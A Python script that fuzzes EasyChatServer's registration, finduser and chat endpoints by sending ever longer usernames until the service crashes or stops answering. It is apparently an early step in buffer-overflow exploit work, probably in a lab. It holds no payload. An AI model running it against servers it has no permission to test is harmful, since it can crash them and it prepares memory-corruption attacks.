"""Fuzz EasyChatServer username-bearing endpoints.

This script replays the registration request captured in Notes.md or fuzzes
`/finduser.ghp?username=...` and `chat.ghp?username=...`, growing the username
until the service stops responding or crashes.
"""

from __future__ import annotations

import argparse
import socket
import sys
from typing import Optional


REQUEST_TEMPLATE = (
    "{method} {path} HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Cache-Control: max-age=0\r\n"
    "Accept-Language: en-US,en;q=0.9\r\n"
    "Origin: http://{host}\r\n"
    "Upgrade-Insecure-Requests: 1\r\n"
    "User-Agent: Mozilla/5.0 (Fuzzing Script)\r\n"
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
    "Referer: http://{host}/register.ghp\r\n"
    "Accept-Encoding: gzip, deflate, br\r\n"
    "Connection: close\r\n"
    "\r\n"
    "{body}"
)


def build_body(username: str) -> str:
    return (
        "UserName={username}&Password=password&Password1=password&Sex=2"
        "&Email=%40&Icon=0.gif&Resume=&cw=1&RoomID=%3C%21--%24RoomID--%3E"
        "&RepUserName=%3C%21--%24UserName--%3E&submit1=Register"
    ).format(username=username)


def build_path(endpoint: str, username: str, method: str) -> str:
    if endpoint == "/finduser.ghp":
        return f"/finduser.ghp?username={username}"
    if endpoint == "/chat.ghp":
        return f"/chat.ghp?username={username}&password=password&room=1&sex=1"

    if method == "GET":
        return f"/registresult.htm?{build_body(username)}"

    return "/registresult.htm"


def send_request(
    host: str,
    port: int,
    username: str,
    timeout: float,
    method: str,
    endpoint: str,
) -> Optional[bytes]:
    method = method.upper()
    path = build_path(endpoint, username, method)
    body = "" if (method == "GET" or endpoint == "/finduser.ghp") else build_body(username)

    headers = REQUEST_TEMPLATE.format(
        method=method,
        path=path,
        host=host,
        body=body,
    )
    if method == "POST":
        headers = headers.replace(
            "Upgrade-Insecure-Requests: 1\r\n",
            "Upgrade-Insecure-Requests: 1\r\n"
            f"Content-Length: {len(body)}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n",
        )

    request = headers.encode("ascii", errors="strict")

    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        sock.sendall(request)
        try:
            return sock.recv(4096)
        except socket.timeout:
            return None


def main() -> int:
    parser = argparse.ArgumentParser(description="Fuzz EasyChatServer username")
    parser.add_argument("--host", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", type=int, default=80, help="Target port")
    parser.add_argument(
        "--start",
        type=int,
        default=10,
        help="Initial username length (default: 10)",
    )
    parser.add_argument(
        "--step",
        type=int,
        default=10,
        help="Amount to grow the username each round (default: 10)",
    )
    parser.add_argument(
        "--stop",
        type=int,
        default=5000,
        help="Stop after reaching this username length",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=3.0,
        help="Socket timeout in seconds",
    )
    parser.add_argument(
        "--char",
        default="A",
        help="Single character used for fuzzing",
    )
    parser.add_argument(
        "--method",
        choices=["GET", "POST"],
        default="POST",
        help="HTTP method to use (default: POST)",
    )
    parser.add_argument(
        "--endpoint",
        choices=["/registresult.htm", "/finduser.ghp", "/chat.ghp"],
        default="/registresult.htm",
        help="Endpoint to fuzz (default: /registresult.htm)",
    )
    args = parser.parse_args()

    if len(args.char) != 1:
        print("[-] --char must be a single character", file=sys.stderr)
        return 1

    for length in range(args.start, args.stop + 1, args.step):
        username = args.char * length
        print(f"[+] Sending username length: {length}")
        try:
            response = send_request(
                args.host,
                args.port,
                username,
                args.timeout,
                args.method,
                args.endpoint,
            )
        except ConnectionResetError:
            print(f"[-] Connection reset at length {length}")
            return 0
        except OSError as exc:
            print(f"[-] Socket error at length {length}: {exc}")
            return 1

        if response is None:
            print(f"[-] No response at length {length}")
            return 0

        preview = response.decode("ascii", errors="replace").strip()
        if preview:
            print(f"[+] Response: {preview[:120]}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
